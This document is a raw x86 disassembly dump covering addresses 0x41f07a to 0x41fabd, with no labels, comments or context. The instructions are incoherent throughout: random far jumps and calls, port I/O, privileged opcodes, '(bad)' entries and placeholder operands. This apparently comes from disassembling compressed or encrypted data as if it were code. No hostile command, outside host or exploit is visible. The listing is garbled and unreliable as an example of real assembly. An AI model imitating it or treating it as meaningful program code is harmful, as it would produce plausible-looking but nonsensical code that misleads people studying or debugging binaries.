  41f07a:	ficomp DWORD PTR [eax+0x1c]
  41f07d:	stos   DWORD PTR es:[edi],eax
  41f07e:	imul   ebp,DWORD PTR [esi+0x734b4afe],0x68
  41f085:	sub    DWORD PTR [ebx-0x4a],esp
  41f088:	jo     0x41f073
  41f08a:	sub    eax,0xb87858fd
  41f08f:	test   eax,0xf5970777
  41f094:	into   
  41f095:	and    esi,DWORD PTR [ebp+0x58]
  41f098:	mov    esi,0xaf62dc29
  41f09d:	pusha  
  41f09e:	jp     0x41f042
  41f0a0:	mov    fs:0xfdae47b9,eax
  41f0a6:	stos   BYTE PTR es:[edi],al
  41f0a7:	nop
  41f0a8:	fwait
  41f0a9:	test   al,0xbb
  41f0ab:	int3   
  41f0ac:	ins    DWORD PTR es:[edi],dx
  41f0ad:	push   ebx
  41f0ae:	lods   al,BYTE PTR ds:[esi]
  41f0af:	sub    ebp,DWORD PTR [eax-0x33]
  41f0b2:	sbb    eax,0xe6c7ad2e
  41f0b7:	clc    
  41f0b8:	xchg   esi,eax
  41f0b9:	cs gs adc eax,0x8a0568bf
  41f0c0:	jmp    0x41f06c
  41f0c2:	mov    bh,0x4
  41f0c4:	dec    edx
  41f0c5:	mov    al,0x91
  41f0c7:	mov    cs,WORD PTR ds:0x44e4fe20
  41f0cd:	sti    
  41f0ce:	shr    dh,1
  41f0d0:	and    ebx,DWORD PTR [edx+0x36]
  41f0d3:	add    ch,bl
  41f0d5:	adc    ah,BYTE PTR [esi]
  41f0d7:	outs   dx,BYTE PTR ds:[esi]
  41f0d8:	cmp    eax,0x10e89e1b
  41f0dd:	cmp    ecx,ebp
  41f0df:	outs   dx,BYTE PTR ds:[esi]
  41f0e0:	push   esp
  41f0e1:	xchg   esi,eax
  41f0e2:	lods   eax,DWORD PTR ds:[esi]
  41f0e3:	cmp    DWORD PTR [edi],edx
  41f0e5:	test   al,0x3c
  41f0e7:	sub    ecx,edi
  41f0e9:	xchg   BYTE PTR [eax],al
  41f0eb:	out    dx,al
  41f0ec:	jbe    0x41f132
  41f0ee:	and    eax,0x2f2e3b58
  41f0f3:	inc    edi
  41f0f4:	das    
  41f0f5:	das    
  41f0f6:	inc    ebx
  41f0f7:	aaa    
  41f0f8:	mov    dh,0xc8
  41f0fa:	scas   eax,DWORD PTR es:[edi]
  41f0fb:	enter  0xb728,0xdf
  41f0ff:	dec    edi
  41f100:	pop    edi
  41f101:	adc    ah,ah
  41f103:	and    ebp,ebp
  41f105:	inc    ebp
  41f106:	into   
  41f107:	dec    edx
  41f108:	cwde   
  41f109:	adc    DWORD PTR ds:0x3a65d29,ebp
  41f10f:	(bad)  
  41f110:	adc    DWORD PTR [ebp+0x606f601d],ebx
  41f116:	mov    BYTE PTR [ebx-0x14394e89],dh
  41f11c:	jb     0x41f11d
  41f11e:	cmp    esi,ecx
  41f120:	lahf   
  41f121:	mov    ds:0x5de7752a,eax
  41f126:	xor    eax,0x61352a1
  41f12b:	jb     0x41f103
  41f12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f12e:	hlt    
  41f12f:	xchg   esi,eax
  41f130:	sar    DWORD PTR [ebx+0x62],cl
  41f133:	out    dx,al
  41f134:	repnz retf 
  41f136:	push   0x9d184ff9
  41f13b:	outs   dx,BYTE PTR ds:[esi]
  41f13c:	adc    cl,BYTE PTR [ebx+0x23]
  41f13f:	arpl   bp,cx
	...
  41f1b1:	add    BYTE PTR [eax],al
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [ecx-0x22f03f7b],edx
  41f1c5:	dec    ebp
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	cmc    
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    dh,bh
  41f1cd:	ror    DWORD PTR [edi],cl
  41f1cf:	fnstsw WORD PTR [edi]
  41f1d1:	jno    0x41f1a6
  41f1d3:	mov    ebx,0xbcde30d6
  41f1d8:	push   ds
  41f1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1da:	push   esi
  41f1db:	out    dx,eax
  41f1dc:	sti    
  41f1dd:	stc    
  41f1de:	dec    esi
  41f1df:	mov    ds:0xb1c95820,al
  41f1e4:	xor    al,0x4a
  41f1e6:	mov    esi,0x9b10721c
  41f1eb:	ins    DWORD PTR es:[edi],dx
  41f1ec:	fcom   DWORD PTR [edx+ebp*8]
  41f1ef:	mov    edi,?
  41f1f1:	aas    
  41f1f2:	mov    WORD PTR [ebp+0x26],cs
  41f1f5:	ins    BYTE PTR es:[edi],dx
  41f1f6:	pop    edi
  41f1f7:	adc    BYTE PTR [edx+0x60fca476],cl
  41f1fd:	xor    DWORD PTR [edx],ebx
  41f1ff:	xchg   ebp,eax
  41f200:	jb     0x41f1bc
  41f202:	and    DWORD PTR [eax+0x1e],0x1d54999e
  41f209:	xchg   esi,eax
  41f20a:	add    esi,edx
  41f20c:	push   ss
  41f20d:	ret    
  41f20e:	push   ds
  41f20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f210:	pop    ebx
  41f211:	pop    eax
  41f212:	enter  0x6766,0xad
  41f216:	(bad)  
  41f217:	js     0x41f273
  41f219:	lods   eax,DWORD PTR ds:[esi]
  41f21a:	mov    dl,0x4b
  41f21c:	test   BYTE PTR [esi],0x9
  41f21f:	imul   BYTE PTR [ebx+0x716daa20]
  41f225:	inc    edi
  41f226:	aam    0x70
  41f228:	imul   esp,DWORD PTR [edx],0xb
  41f22b:	mov    edx,0xb7ea9cf5
  41f230:	call   0x2ecf:0xfe345ab0
  41f237:	add    cl,BYTE PTR [esi-0x2b]
  41f23a:	xchg   esi,eax
  41f23b:	fiadd  WORD PTR [ecx]
  41f23d:	fdivr  QWORD PTR [edx+ecx*2+0x504b5507]
  41f244:	mov    DWORD PTR [esi-0x33],ebp
  41f247:	add    dl,BYTE PTR [esi+0x69]
  41f24a:	jbe    0x41f25a
  41f24c:	lds    esp,FWORD PTR [ebp-0x7fac2b70]
  41f252:	outs   dx,DWORD PTR ds:[esi]
  41f253:	shr    BYTE PTR [ebp+0x158ebae],cl
  41f259:	adc    esp,ebp
  41f25b:	cmp    bl,0x27
  41f25e:	sub    BYTE PTR [edi+eax*2-0x80],cl
  41f262:	out    dx,al
  41f263:	jb     0x41f285
  41f265:	sub    DWORD PTR [ebp+0xc],ecx
  41f268:	sbb    bl,ah
  41f26a:	cmp    eax,0x9d3e1459
  41f26f:	in     al,0x8c
  41f271:	test   BYTE PTR [edi-0x3fcc070],ah
  41f277:	xchg   ecx,ebp
  41f279:	cmp    ecx,esp
  41f27b:	outs   dx,BYTE PTR ds:[esi]
  41f27c:	or     ah,BYTE PTR [edx+0x21]
  41f27f:	scas   al,BYTE PTR es:[edi]
  41f280:	sbb    edx,edx
  41f282:	cli    
  41f283:	mov    edi,0x4fb01f31
  41f288:	pop    ss
  41f289:	inc    ebx
  41f28a:	add    eax,0xfdb50c6e
  41f28f:	pop    es
  41f290:	aaa    
  41f291:	stc    
  41f292:	rcr    BYTE PTR [esi+0x7bd6edcc],1
  41f298:	leave  
  41f299:	xchg   ebp,eax
  41f29a:	adc    bh,BYTE PTR [edi-0xa7e7011]
  41f2a0:	cdq    
  41f2a1:	push   es
  41f2a2:	jle    0x41f322
  41f2a4:	or     BYTE PTR [bp-0x2c],0x4e
  41f2a9:	jmp    0x72fb:0x8408d73
  41f2b0:	mov    bh,BYTE PTR [esi+0x6c8fda56]
  41f2b6:	pop    edx
  41f2b7:	js     0x41f27c
  41f2b9:	(bad)  
  41f2ba:	xchg   ecx,eax
  41f2bb:	ss mov esi,0xd7c9f58a
	...
  41f331:	add    BYTE PTR [eax],al
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0xebf1:0xa99531a0
  41f343:	loopne 0x41f317
  41f345:	dec    esi
  41f346:	add    DWORD PTR [eax],eax
  41f348:	cmc    
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [ecx-0x60],ch
  41f34e:	shl    BYTE PTR [edx+0x200ef566],0xb0
  41f355:	dec    edx
  41f356:	xor    BYTE PTR [edi],bh
  41f358:	xor    eax,0x80376d58
  41f35d:	jnp    0x41f362
  41f35f:	push   ecx
  41f360:	jno    0x41f313
  41f362:	pop    ecx
  41f363:	ret    
  41f364:	ret    
  41f365:	jnp    0x41f321
  41f367:	mov    bl,0xdc
  41f369:	lahf   
  41f36a:	sbb    BYTE PTR [edx-0x4d],0xd8
  41f36e:	jns    0x41f3e9
  41f370:	inc    ebp
  41f371:	xchg   ecx,eax
  41f372:	xchg   esi,eax
  41f373:	pop    edi
  41f374:	aas    
  41f375:	jo     0x41f3e9
  41f377:	(bad)  
  41f379:	arpl   WORD PTR [ebx-0x4ff6e198],ax
  41f37f:	getsec 
  41f381:	xchg   BYTE PTR [ebp+0x37aeac],dh
  41f387:	call   0x7b0b8b5f
  41f38c:	dec    ecx
  41f38d:	sub    DWORD PTR [eax],ebx
  41f38f:	push   ecx
  41f390:	mov    al,0x44
  41f392:	mov    ds:0xec13b5fd,al
  41f397:	cdq    
  41f398:	fwait
  41f399:	mov    edi,0xaa1f0567
  41f39e:	sbb    al,0x5f
  41f3a0:	cmp    al,BYTE PTR [ecx]
  41f3a2:	xchg   esi,eax
  41f3a3:	daa    
  41f3a4:	ins    DWORD PTR es:[edi],dx
  41f3a5:	dec    edi
  41f3a6:	inc    ecx
  41f3a7:	pop    eax
  41f3a8:	int    0xa7
  41f3aa:	sbb    DWORD PTR [eax+eiz*4-0x4f780507],edx
  41f3b1:	loope  0x41f35a
  41f3b3:	scas   eax,DWORD PTR es:[edi]
  41f3b4:	pop    edi
  41f3b5:	in     al,dx
  41f3b6:	ins    BYTE PTR es:[edi],dx
  41f3b7:	mov    eax,ds:0x22b6b0da
  41f3bc:	mov    dh,bh
  41f3be:	repz jb 0x41f400
  41f3c1:	fisub  WORD PTR [eax+0x2559516c]
  41f3c7:	pop    edx
  41f3c8:	mov    ch,0xa7
  41f3ca:	or     BYTE PTR [edi],bh
  41f3cc:	xor    dh,BYTE PTR [edx+0x7a92acab]
  41f3d2:	jmp    0xa9a:0x1640a589
  41f3d9:	inc    ebp
  41f3da:	and    eax,0xaaeed4cb
  41f3df:	fisubr DWORD PTR [edx+ecx*4+0x7fbe0dfa]
  41f3e6:	cmp    eax,0xb93af966
  41f3eb:	sbb    bh,ah
  41f3ed:	sub    al,0x65
  41f3ef:	xchg   esi,eax
  41f3f0:	cmp    al,BYTE PTR [edx+0x6f]
  41f3f3:	cmp    ch,BYTE PTR [ebx-0x6d]
  41f3f6:	inc    ebx
  41f3f7:	repnz dec ecx
  41f3f9:	xchg   BYTE PTR [edx+ecx*8],ch
  41f3fc:	and    cl,BYTE PTR [eax-0x66]
  41f3ff:	hlt    
  41f400:	call   0xd211:0x60aefa76
  41f407:	add    bh,0x31
  41f40a:	jl     0x41f38d
  41f40c:	icebp  
  41f40d:	mov    edi,0x9d12cf1a
  41f412:	out    0xdc,eax
  41f414:	xor    al,0x2f
  41f416:	test   DWORD PTR [edx+0x3c60846d],ebx
  41f41c:	cmp    DWORD PTR [esi-0x61],ebx
  41f41f:	out    dx,al
  41f420:	mov    edi,0x627e28a5
  41f425:	dec    eax
  41f426:	fcomp  DWORD PTR [esi]
  41f428:	inc    ecx
  41f429:	lods   eax,DWORD PTR ds:[esi]
  41f42a:	jmp    0x367a:0x80d12afc
  41f431:	and    bh,BYTE PTR [ebx-0x2]
  41f434:	xchg   edx,eax
  41f435:	sbb    ebp,DWORD PTR [ebx]
  41f437:	lock lock xchg BYTE PTR [esi+eiz*8],dl
  41f43c:	jnp    0x41f484
  41f43e:	mov    bl,0x12
  41f440:	sub    eax,DWORD PTR [eax]
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x3c
  41f4c1:	dec    esp
  41f4c2:	lock sub eax,0x14fc7
  41f4c8:	cmc    
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [edi+0x4a],dl
  41f4ce:	outs   dx,DWORD PTR ds:[esi]
  41f4cf:	or     al,0xbd
  41f4d1:	mov    ah,0xc0
  41f4d3:	inc    eax
  41f4d4:	dec    ebx
  41f4d5:	sbb    eax,DWORD PTR [esi-0x39]
  41f4d8:	pop    ebp
  41f4d9:	aaa    
  41f4da:	cmp    BYTE PTR [ebp-0x7e],ch
  41f4dd:	and    BYTE PTR [ebp+0x2a],ah
  41f4e0:	inc    esi
  41f4e1:	lds    edx,FWORD PTR [edi-0x4f]
  41f4e4:	add    eax,0x62aa3bea
  41f4e9:	les    esp,FWORD PTR [esi+0x28]
  41f4ec:	out    dx,eax
  41f4ed:	je     0x41f52b
  41f4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f0:	and    DWORD PTR [ebx],ebx
  41f4f2:	ins    BYTE PTR es:[edi],dx
  41f4f3:	pop    ss
  41f4f4:	ja     0x41f4b8
  41f4f6:	sub    al,BYTE PTR [esp+ebx*2+0x42]
  41f4fa:	jnp    0x41f4f9
  41f4fc:	adc    BYTE PTR [eax],bl
  41f4fe:	scas   eax,DWORD PTR es:[edi]
  41f4ff:	ficom  DWORD PTR [edi+0x47a20403]
  41f505:	dec    ebp
  41f506:	push   ss
  41f507:	retf   0xaff2
  41f50a:	or     eax,0x7abfd4ed
  41f50f:	pop    ss
  41f510:	and    eax,0xf95e1ae8
  41f515:	ror    DWORD PTR [eax+0x34],1
  41f518:	clc    
  41f519:	and    al,BYTE PTR ds:0xf5a53747
  41f51f:	ins    BYTE PTR es:[edi],dx
  41f520:	and    edi,edi
  41f522:	mov    ebp,0xa561475c
  41f527:	jge    0x41f5a6
  41f529:	xchg   ebp,eax
  41f52a:	stc    
  41f52b:	xchg   ebx,eax
  41f52c:	hlt    
  41f52d:	(bad)  
  41f52e:	and    eax,DWORD PTR [esi]
  41f530:	out    dx,eax
  41f531:	mov    eax,ds:0x61a093b
  41f536:	test   al,0xa1
  41f538:	jnp    0x41f564
  41f53a:	out    dx,al
  41f53b:	or     esp,DWORD PTR [edx+eax*2]
  41f53e:	mov    ds:0x57dcf691,eax
  41f543:	ss popf 
  41f545:	out    dx,eax
  41f546:	mov    ecx,DWORD PTR [edx]
  41f548:	mov    ah,0x4b
  41f54a:	mov    WORD PTR ds:0x921db012,cs
  41f550:	idiv   BYTE PTR [edi-0x78]
  41f553:	xchg   edx,eax
  41f554:	adc    al,0x6f
  41f556:	repz shr DWORD PTR [edi-0x4],cl
  41f55a:	stc    
  41f55b:	or     eax,edi
  41f55d:	imul   BYTE PTR cs:[edx-0x3dbeab10]
  41f564:	push   eax
  41f565:	scas   eax,DWORD PTR es:[edi]
  41f566:	and    ch,ch
  41f568:	pop    ebp
  41f569:	xchg   esp,eax
  41f56a:	jns    0x41f520
  41f56c:	pop    esp
  41f56d:	in     al,0xde
  41f56f:	dec    ebx
  41f570:	scas   eax,DWORD PTR es:[edi]
  41f571:	(bad)  
  41f572:	adc    BYTE PTR [eax+0x7cc7bbc2],0xa3
  41f579:	mov    ah,0xa2
  41f57b:	adc    al,0xee
  41f57d:	push   edi
  41f57e:	cmc    
  41f57f:	and    esi,esp
  41f581:	sbb    DWORD PTR ds:[esi],ebx
  41f584:	jo     0x41f5ce
  41f586:	dec    edi
  41f587:	push   ebp
  41f588:	scas   al,BYTE PTR es:[edi]
  41f589:	mov    bh,BYTE PTR [eax-0x647228fa]
  41f58f:	pop    ss
  41f590:	gs mov ch,0x6b
  41f593:	add    BYTE PTR [ecx+edx*8+0x4f],al
  41f597:	out    dx,al
  41f598:	ja     0x41f533
  41f59a:	jle    0x41f549
  41f59c:	push   ds
  41f59d:	and    BYTE PTR [edi+0x2ef8b863],dl
  41f5a3:	mov    bh,0xc7
  41f5a5:	push   edi
  41f5a6:	pusha  
  41f5a7:	jae    0x41f5be
  41f5a9:	xor    al,0x31
  41f5ab:	add    dh,cl
  41f5ad:	cmp    BYTE PTR [eax+0x1],ch
  41f5b0:	aam    0x64
  41f5b2:	scas   eax,DWORD PTR es:[edi]
  41f5b3:	scas   al,BYTE PTR es:[edi]
  41f5b4:	xor    BYTE PTR [edi+0xb6b64db],0xff
  41f5bb:	rol    BYTE PTR [ecx-0x6b9c78fe],1
	...
  41f631:	add    BYTE PTR [eax],al
  41f633:	add    ch,al
  41f635:	cwde   
  41f636:	loope  0x41f68d
  41f638:	std    
  41f639:	jge    0x41f630
  41f63b:	cwde   
  41f63c:	and    eax,0x8501e835
  41f641:	add    BYTE PTR [edi+0x150bc02],ah
  41f647:	add    ch,dh
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    BYTE PTR [edx],dh
  41f64d:	das    
  41f64e:	lahf   
  41f64f:	adc    DWORD PTR [esi],ecx
  41f651:	adc    esp,DWORD PTR [ebp-0x3a311dd7]
  41f657:	push   es
  41f658:	lahf   
  41f659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f65a:	push   ds
  41f65b:	xchg   esi,eax
  41f65c:	lods   eax,DWORD PTR ds:[esi]
  41f65d:	mov    ds:0x67529f07,al
  41f662:	and    ah,BYTE PTR [eax+0xfb928df]
  41f668:	fsub   DWORD PTR [ecx+eiz*8]
  41f66b:	fwait
  41f66c:	and    eax,0x9b652682
  41f671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f672:	push   ss
  41f673:	xor    BYTE PTR [ebx-0x542220fc],ch
  41f679:	xchg   BYTE PTR [eax*1-0xd5f424a],cl
  41f680:	in     eax,dx
  41f681:	dec    ecx
  41f682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f683:	dec    ebx
  41f684:	and    eax,DWORD PTR [edi+eax*2+0x35]
  41f688:	das    
  41f689:	ret    
  41f68a:	push   ecx
  41f68b:	add    eax,0xb09c0402
  41f690:	pop    ebx
  41f691:	in     eax,dx
  41f692:	mov    ch,0xd5
  41f694:	ret    
  41f695:	test   al,0x30
  41f697:	cmp    al,0x5d
  41f699:	mov    ds:0x6b8c1413,eax
  41f69e:	and    dl,al
  41f6a0:	lods   eax,DWORD PTR ds:[esi]
  41f6a1:	iret   
  41f6a2:	lds    eax,FWORD PTR [edx+0x41955f81]
  41f6a8:	mov    edx,0x2d094d9
  41f6ad:	cdq    
  41f6ae:	out    0x26,al
  41f6b0:	jnp    0x41f6d7
  41f6b2:	iret   
  41f6b3:	sub    al,0x5a
  41f6b5:	test   esi,ebx
  41f6b7:	ss daa 
  41f6b9:	push   ebp
  41f6ba:	push   ds
  41f6bb:	mov    al,0x5
  41f6bd:	int3   
  41f6be:	int    0xcd
  41f6c0:	ds pop edi
  41f6c2:	stc    
  41f6c3:	mov    esi,0x897264f6
  41f6c8:	imul   ebp,esp,0x2d8b55dd
  41f6ce:	xor    eax,0x6c482e54
  41f6d3:	adc    ebx,0x9b66a606
  41f6d9:	sub    al,0xdc
  41f6db:	das    
  41f6dc:	daa    
  41f6dd:	aaa    
  41f6de:	or     edi,eax
  41f6e0:	scas   eax,DWORD PTR es:[edi]
  41f6e1:	pop    ecx
  41f6e2:	add    eax,0xad4296a5
  41f6e7:	dec    ebx
  41f6e8:	xor    ecx,DWORD PTR [ebp-0x62fb4302]
  41f6ee:	mov    ds:0xaceb1b1,al
  41f6f3:	adc    eax,0x718c9bc3
  41f6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6f9:	dec    edx
  41f6fa:	sub    eax,0xdf6feb5a
  41f6ff:	add    al,0x9d
  41f701:	call   0x65fb340a
  41f706:	mov    gs:0xe49d8324,al
  41f70c:	aaa    
  41f70d:	test   al,0xdd
  41f70f:	in     al,dx
  41f710:	cmp    eax,0xc79f0383
  41f715:	in     eax,dx
  41f716:	push   esp
  41f717:	xor    BYTE PTR [ecx],ah
  41f719:	test   eax,0x61cbb017
  41f71e:	pop    es
  41f71f:	mov    eax,0x5274ab15
  41f724:	(bad)  
  41f726:	jno    0x41f704
  41f728:	std    
  41f729:	pop    esp
  41f72a:	xor    eax,0x9f341670
  41f72f:	push   0xa4fec699
  41f734:	sahf   
  41f735:	xchg   esi,eax
  41f736:	(bad)  
  41f737:	popa   
  41f738:	fld    TBYTE PTR [esi]
  41f73a:	jno    0x41f753
  41f73c:	fisubr WORD PTR [edi]
  41f73e:	jmp    FWORD PTR ds:0x73
	...
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	mov    DWORD PTR [esi-0x6],edi
  41f7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7c4:	mov    cl,0x51
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [ebp-0x64e8b7f8],al
  41f7d1:	cs stos BYTE PTR es:[edi],al
  41f7d3:	out    dx,eax
  41f7d4:	mov    DWORD PTR [ecx+edx*8],edi
  41f7d7:	loope  0x41f75a
  41f7d9:	cmp    ebx,edx
  41f7db:	imul   DWORD PTR [ecx-0x4]
  41f7de:	sbb    al,0xc1
  41f7e0:	call   DWORD PTR [ebp+0x28e8979a]
  41f7e6:	push   eax
  41f7e7:	shl    BYTE PTR [eax-0x4b],cl
  41f7ea:	mov    al,0x2e
  41f7ec:	adc    al,cl
  41f7ee:	xchg   ecx,eax
  41f7ef:	cwde   
  41f7f0:	test   eax,0x452a6faa
  41f7f5:	ja     0x41f793
  41f7f7:	mov    bl,dh
  41f7f9:	mov    esp,0x674444e9
  41f7fe:	ds and BYTE PTR ss:[edx+0x32],cl
  41f803:	(bad)
  41f806:	loopne 0x41f7bb
  41f808:	add    al,BYTE PTR [ebp-0xc]
  41f80b:	les    ecx,FWORD PTR [eax]
  41f80d:	cwde   
  41f80e:	xchg   ecx,eax
  41f80f:	jmp    DWORD PTR [ecx-0x37]
  41f812:	ja     0x41f842
  41f814:	fs xchg ecx,eax
  41f816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f817:	xchg   ebx,eax
  41f818:	sar    bh,1
  41f81a:	scas   al,BYTE PTR es:[edi]
  41f81b:	jle    0x41f832
  41f81d:	adc    ebx,DWORD PTR [ecx]
  41f81f:	adc    eax,0x976fb4f7
  41f824:	adc    ecx,DWORD PTR [eax*4-0x165f935b]
  41f82b:	and    eax,0xc2aae558
  41f830:	inc    ebx
  41f831:	xor    bl,BYTE PTR ds:0x98f7a030
  41f837:	xor    DWORD PTR [eax+esi*8],eax
  41f83a:	dec    esi
  41f83b:	and    al,0xd9
  41f83d:	push   esp
  41f83e:	adc    al,0x8c
  41f840:	mov    ds:0x37cd33de,al
  41f845:	imul   ecx,DWORD PTR [ebp-0x52797de0],0xbcd1c668
  41f84f:	idiv   BYTE PTR [ebp+0x5c6e2a78]
  41f855:	push   ebp
  41f856:	nop
  41f857:	pop    ebx
  41f858:	in     eax,0xb0
  41f85a:	cdq    
  41f85b:	sti    
  41f85c:	ins    BYTE PTR es:[edi],dx
  41f85d:	imul   ecx,DWORD PTR [edx+0x31ceb370],0x13abe58
  41f867:	push   0x2354866b
  41f86c:	int3   
  41f86d:	push   ebx
  41f86e:	lods   al,BYTE PTR ds:[esi]
  41f86f:	int3   
  41f870:	push   ss
  41f871:	mov    ds:0x5de90edf,eax
  41f876:	cs mov ecx,0xc401f776
  41f87c:	fild   DWORD PTR [ebx]
  41f87e:	jle    0x41f8b5
  41f880:	int3   
  41f881:	inc    ebx
  41f882:	inc    esp
  41f883:	pop    es
  41f884:	in     eax,0x8
  41f886:	and    ecx,esi
  41f888:	pop    ds
  41f889:	stos   DWORD PTR es:[edi],eax
  41f88a:	rcr    BYTE PTR [edx+0x3f],0x73
  41f88e:	jle    0x41f8c7
  41f890:	inc    edx
  41f891:	les    ecx,FWORD PTR [edx-0x19c698b]
  41f897:	adc    edx,0xffffffee
  41f89a:	bswap  esi
  41f89c:	and    ch,BYTE PTR [edi+0x6d07541f]
  41f8a2:	int    0x5
  41f8a4:	arpl   WORD PTR [edx],bp
  41f8a6:	(bad)  
  41f8a7:	push   DWORD PTR [esi-0x252e4b3d]
  41f8ad:	ins    DWORD PTR es:[edi],dx
  41f8ae:	push   esi
  41f8af:	push   ss
  41f8b0:	pop    ebx
  41f8b1:	and    cl,cl
  41f8b3:	mov    bl,0xfb
  41f8b5:	lods   eax,DWORD PTR ds:[esi]
  41f8b6:	inc    eax
  41f8b7:	ret    
  41f8b8:	(bad)  
  41f8b9:	in     al,dx
  41f8ba:	jnp    0x41f8ed
  41f8bc:	mov    ?,WORD PTR [ecx+0x952d40]
	...
  41f932:	add    BYTE PTR [eax],al
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x659ffef7
  41f941:	ret    
  41f942:	gs push esp
  41f944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f945:	push   edx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [edx-0x37],bh
  41f94e:	adc    eax,0xd95e96cb
  41f953:	push   ebp
  41f954:	in     al,0x18
  41f956:	jno    0x41f9a7
  41f958:	(bad)  
  41f959:	iret   
  41f95a:	outs   dx,DWORD PTR ds:[esi]
  41f95b:	jb     0x41f904
  41f95d:	jnp    0x41f933
  41f95f:	pop    ebp
  41f960:	mov    ds,WORD PTR [edx+0xfcb5d6a]
  41f966:	les    esp,FWORD PTR [ebp-0x66]
  41f969:	jno    0x41f944
  41f96b:	sbb    ch,dh
  41f96d:	out    0x93,al
  41f96f:	fs (bad) 
  41f971:	jmpw   0xd1da
  41f975:	ret    0x74f2
  41f978:	jl     0x41f933
  41f97a:	jnp    0x41f982
  41f97c:	ret    0x5741
  41f97f:	int    0x4d
  41f981:	xor    al,0x4
  41f983:	push   ecx
  41f984:	retf   
  41f985:	jns    0x41f9d8
  41f987:	or     BYTE PTR [esi-0x2a],ah
  41f98a:	jp     0x41f97f
  41f98c:	mov    edi,0x5dc6380
  41f991:	dec    esp
  41f992:	out    0xf8,al
  41f994:	mov    ebx,0x8be40aa6
  41f999:	and    al,0x46
  41f99b:	xor    eax,0x1a209241
  41f9a0:	in     al,0xa8
  41f9a2:	xor    al,0x2e
  41f9a4:	call   FWORD PTR [ebx-0x74]
  41f9a7:	aas    
  41f9a8:	test   eax,0xf2bc0e49
  41f9ad:	mov    dh,0x63
  41f9af:	jno    0x41f946
  41f9b1:	mov    edx,0x5731a905
  41f9b6:	mov    ah,0x97
  41f9b8:	sub    eax,0x63ac4456
  41f9bd:	jle    0x41f95e
  41f9bf:	inc    edi
  41f9c0:	ins    BYTE PTR es:[edi],dx
  41f9c1:	outs   dx,DWORD PTR ds:[esi]
  41f9c2:	sbb    BYTE PTR [edi],ch
  41f9c4:	ja     0x41f988
  41f9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9c7:	aaa    
  41f9c8:	sbb    DWORD PTR [edi],eax
  41f9ca:	or     cl,BYTE PTR [edi-0x23934522]
  41f9d0:	cmp    esp,DWORD PTR [edi]
  41f9d2:	mov    ds:0x7b2e4f9c,eax
  41f9d7:	pop    ebp
  41f9d8:	xchg   BYTE PTR [edi-0x43ffa50],bl
  41f9de:	sbb    al,0xef
  41f9e0:	out    dx,al
  41f9e1:	push   eax
  41f9e2:	and    DWORD PTR [ebp+eiz*4+0x1b],ebp
  41f9e6:	out    dx,al
  41f9e7:	aaa    
  41f9e8:	jnp    0x41f9f5
  41f9ea:	cdq    
  41f9eb:	das    
  41f9ec:	stc    
  41f9ed:	fdiv   st,st(7)
  41f9ef:	mov    dh,0xa3
  41f9f1:	or     ebp,DWORD PTR [ebp+0x3909db8e]
  41f9f7:	mov    WORD PTR [esi],cs
  41f9f9:	mov    cl,ch
  41f9fb:	mov    dh,0x13
  41f9fd:	mov    ebp,0x3c6a4ea1
  41fa02:	repnz repnz and ah,BYTE PTR [ebx+esi*2-0x14306c11]
  41fa0b:	dec    ebx
  41fa0c:	cld    
  41fa0d:	(bad)  
  41fa0e:	jmp    0xb6cb:0x3b7674a0
  41fa15:	fsub   st,st(1)
  41fa17:	int3   
  41fa18:	jns    0x41fa14
  41fa1a:	repz test DWORD PTR [edx-0x5cf0c31d],edi
  41fa21:	fwait
  41fa22:	xlat   BYTE PTR ds:[ebx]
  41fa23:	push   ds
  41fa24:	push   ebx
  41fa25:	dec    ebx
  41fa26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa27:	ja     0x41f9e8
  41fa29:	lods   eax,DWORD PTR ds:[esi]
  41fa2a:	add    DWORD PTR [edx],ebp
  41fa2c:	repnz in al,dx
  41fa2e:	push   0xffffff86
  41fa30:	sar    BYTE PTR [ecx+ebp*4+0x21],cl
  41fa34:	mov    ah,dh
  41fa36:	mov    esi,0xea00a3ef
  41fa3b:	pusha  
  41fa3c:	test   eax,0x88a7c358
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
